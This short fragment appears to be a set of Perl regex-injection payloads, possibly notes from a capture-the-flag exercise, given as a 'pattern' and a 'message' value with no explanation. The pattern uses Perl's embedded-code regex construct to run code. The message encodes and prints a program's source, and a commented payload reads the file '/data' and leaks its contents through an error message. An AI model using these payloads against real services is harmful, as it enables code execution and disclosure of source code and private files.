pattern = "(?{ $count++ })a"
message = "encode_base64(memGzip($source), ''); print substr($encoded,0,3000)"
# (?{ open F,'/data'; my $s=<F>; die $s })
